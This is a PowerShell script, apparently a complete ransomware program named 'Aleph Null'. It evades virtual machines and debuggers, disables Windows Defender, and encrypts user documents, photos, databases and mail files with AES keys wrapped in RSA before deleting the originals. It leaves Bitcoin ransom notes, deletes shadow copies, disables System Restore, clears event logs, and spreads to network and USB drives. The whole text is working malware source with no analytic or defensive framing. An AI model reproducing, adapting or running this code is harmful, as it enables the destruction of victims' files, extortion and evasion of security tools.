

param(
    [string]$TargetPath = "C:\Users",
    [string]$Extension = ".locked",
    [string]$RansomNote = "READ_ME_TO_RESTORE.txt",
    [string]$PublicKeyFile = "public_key.txt"
)

# Global Variables
$global:EncryptionKey = $null
$global:IV = $null
$global:TargetFiles = @()
$global:EncryptedFiles = @()
$global:StartTime = Get-Date

# Anti-Analysis Techniques
function Start-AntiAnalysis {
    # Check for virtual environments
    $vmIndicators = @(
        "VMware",
        "VirtualBox", 
        "QEMU",
        "Xen",
        "Hyper-V"
    )
    
    $systemInfo = Get-WmiObject -Class Win32_ComputerSystem
    foreach ($indicator in $vmIndicators) {
        if ($systemInfo.Manufacturer -like "*$indicator*" -or $systemInfo.Model -like "*$indicator*") {
            Write-Host "Virtual environment detected - terminating..."
            exit
        }
    }
    
    # Check for debugging tools
    $debuggerProcesses = @(
        "procmon",
        "procexp", 
        "wireshark",
        "fiddler",
        "x64dbg",
        "ollydbg"
    )
    
    foreach ($process in $debuggerProcesses) {
        if (Get-Process $process -ErrorAction SilentlyContinue) {
            Write-Host "Debugger detected - terminating..."
            exit
        }
    }
    
    # Disable Windows Defender
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Failed to disable Windows Defender"
    }
}

# Generate RSA Key Pair
function New-RSAKeyPair {
    try {
        $rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new(2048)
        $global:EncryptionKey = $rsa.ToXmlString($false)
        $privateKey = $rsa.ToXmlString($true)
        
        # Save public key
        $global:EncryptionKey | Out-File -FilePath $PublicKeyFile -Encoding UTF8
        
        return $privateKey
    } catch {
        Write-Host "Failed to generate RSA keys"
        return $null
    }
}

# AES Encryption Function
function Encrypt-FileAES {
    param(
        [string]$FilePath,
        [byte[]]$Key,
        [byte[]]$IV
    )
    
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.IV = $IV
        
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        
        $encryptor = $aes.CreateEncryptor()
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        
        $cs.Write($fileContent, 0, $fileContent.Length)
        $cs.FlushFinalBlock()
        
        $encryptedContent = $ms.ToArray()
        
        $cs.Close()
        $ms.Close()
        $aes.Clear()
        
        return $encryptedContent
    } catch {
        Write-Host "Failed to encrypt file: $FilePath"
        return $null
    }
}

# Generate Random AES Key
function New-AESKey {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.GenerateKey()
    $aes.GenerateIV()
    
    return @{
        Key = $aes.Key
        IV = $aes.IV
    }
}

# File Discovery
function Find-TargetFiles {
    param([string]$Path)
    
    $fileTypes = @(
        "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx",
        "*.pdf", "*.txt", "*.rtf", "*.odt", "*.ods", "*.odp",
        "*.jpg", "*.jpeg", "*.png", "*.gif", "*.bmp", "*.tiff",
        "*.mp3", "*.mp4", "*.avi", "*.mov", "*.wmv", "*.flv",
        "*.zip", "*.rar", "*.7z", "*.tar", "*.gz",
        "*.sql", "*.mdb", "*.accdb", "*.db", "*.sqlite",
        "*.pst", "*.ost", "*.msg", "*.eml"
    )
    
    $targetFiles = @()
    
    foreach ($fileType in $fileTypes) {
        try {
            $files = Get-ChildItem -Path $Path -Filter $fileType -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                if ($file.PSIsContainer -eq $false) {
                    $targetFiles += $file.FullName
                }
            }
        } catch {
            continue
        }
    }
    
    return $targetFiles
}

# Encrypt Files
function Start-FileEncryption {
    param([string[]]$Files)
    
    $encryptedCount = 0
    $totalFiles = $Files.Count
    
    Write-Host "Starting encryption of $totalFiles files..."
    
    foreach ($file in $Files) {
        try {
            # Generate unique AES key for each file
            $aesKey = New-AESKey
            
            # Encrypt file with AES
            $encryptedContent = Encrypt-FileAES -FilePath $file -Key $aesKey.Key -IV $aesKey.IV
            
            if ($encryptedContent) {
                # Encrypt AES key with RSA
                $rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new()
                $rsa.FromXmlString($global:EncryptionKey)
                $encryptedAESKey = $rsa.Encrypt($aesKey.Key, $false)
                
                # Combine encrypted AES key, IV, and encrypted file content
                $finalContent = $encryptedAESKey.Length + $aesKey.IV.Length
                $combinedContent = New-Object byte[] ($finalContent + $encryptedContent.Length)
                
                [System.Buffer]::BlockCopy([BitConverter]::GetBytes($encryptedAESKey.Length), 0, $combinedContent, 0, 4)
                [System.Buffer]::BlockCopy($encryptedAESKey, 0, $combinedContent, 4, $encryptedAESKey.Length)
                [System.Buffer]::BlockCopy($aesKey.IV, 0, $combinedContent, 4 + $encryptedAESKey.Length, $aesKey.IV.Length)
                [System.Buffer]::BlockCopy($encryptedContent, 0, $combinedContent, 4 + $encryptedAESKey.Length + $aesKey.IV.Length, $encryptedContent.Length)
                
                # Write encrypted file
                $encryptedFilePath = $file + $Extension
                [System.IO.File]::WriteAllBytes($encryptedFilePath, $combinedContent)
                
                # Delete original file
                Remove-Item $file -Force -ErrorAction SilentlyContinue
                
                $global:EncryptedFiles += $encryptedFilePath
                $encryptedCount++
                
                Write-Host "Encrypted: $file -> $encryptedFilePath"
            }
        } catch {
            Write-Host "Failed to encrypt: $file"
            continue
        }
    }
    
    return $encryptedCount
}

# Generate Ransom Note
function New-RansomNote {
    $noteContent = @"
YOUR FILES HAVE BEEN ENCRYPTED!

All your personal files, documents, photos, and databases have been locked with military-grade encryption.
Your unique ID: $([System.GUID]::NewGuid().ToString())

To restore your files:
1. Send 0.5 Bitcoin to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
2. Email your transaction ID and system ID to: restore@alephnull.onion
3. You will receive the decryption key within 24 hours

WARNING:
- Do not attempt to decrypt files yourself - this will cause permanent data loss
- Do not turn off your computer - this may corrupt the decryption process
- You have 72 hours to pay before your files are permanently deleted

Files encrypted: $($global:EncryptedFiles.Count)
Encryption time: $((Get-Date) - $global:StartTime)

This is not a game. Your data is at serious risk.
"@
    
    # Create ransom note in multiple locations
    $notePaths = @(
        "$env:USERPROFILE\Desktop\$RansomNote",
        "$env:USERPROFILE\Documents\$RansomNote",
        "$env:PUBLIC\Desktop\$RansomNote",
        "C:\$RansomNote"
    )
    
    foreach ($path in $notePaths) {
        try {
            $noteContent | Out-File -FilePath $path -Encoding UTF8
        } catch {
            continue
        }
    }
}

# Modify System Settings
function Set-SystemModifications {
    # Set wallpaper
    try {
        Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name "Wallpaper" -Value "C:\Windows\Web\Wallpaper\Windows\img0.jpg"
        RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
    } catch {
        Write-Host "Failed to change wallpaper"
    }
    
    # Disable System Restore
    try {
        Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Failed to disable System Restore"
    }
    
    # Delete shadow copies
    try {
        vssadmin delete shadows /all /quiet -ErrorAction SilentlyContinue
    } catch {
        Write-Host "Failed to delete shadow copies"
    }
    
    # Clear event logs
    try {
        $eventLogs = @("Application", "System", "Security")
        foreach ($log in $eventLogs) {
            Remove-EventLog -LogName $log -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Host "Failed to clear event logs"
    }
}

# Network Propagation
function Start-NetworkPropagation {
    try {
        # Map network drives
        $netDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -like "\\*" }
        
        foreach ($drive in $netDrives) {
            $networkFiles = Find-TargetFiles -Path $drive.Root
            if ($networkFiles.Count -gt 0) {
                Start-FileEncryption -Files $networkFiles
            }
        }
        
        # Spread to removable media
        $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
        foreach ($drive in $removableDrives) {
            $usbFiles = Find-TargetFiles -Path "$($drive.DeviceID)\"
            if ($usbFiles.Count -gt 0) {
                Start-FileEncryption -Files $usbFiles
            }
        }
    } catch {
        Write-Host "Network propagation failed"
    }
}

# Main Execution
function Main {
    Write-Host "Aleph Null Ransomware - Initializing..."
    
    # Anti-analysis checks
    Start-AntiAnalysis
    
    # Generate encryption keys
    $privateKey = New-RSAKeyPair
    if (-not $privateKey) {
        Write-Host "Key generation failed - exiting..."
        exit
    }
    
    # Discover target files
    Write-Host "Discovering target files..."
    $global:TargetFiles = Find-TargetFiles -Path $TargetPath
    Write-Host "Found $($global:TargetFiles.Count) target files"
    
    # Encrypt files
    $encryptedCount = Start-FileEncryption -Files $global:TargetFiles
    Write-Host "Successfully encrypted $encryptedCount files"
    
    # Generate ransom notes
    New-RansomNote
    Write-Host "Ransom notes generated"
    
    # Modify system settings
    Set-SystemModifications
    Write-Host "System modifications applied"
    
    # Network propagation
    Start-NetworkPropagation
    Write-Host "Network propagation completed"
    
    # Display summary
    Write-Host "=== ENCRYPTION COMPLETE ==="
    Write-Host "Files encrypted: $encryptedCount"
    Write-Host "Execution time: $((Get-Date) - $global:StartTime)"
    Write-Host "Public key saved to: $PublicKeyFile"
    Write-Host "Private key (KEEP SAFE):"
    Write-Host $privateKey
}

# Execute main function
Main
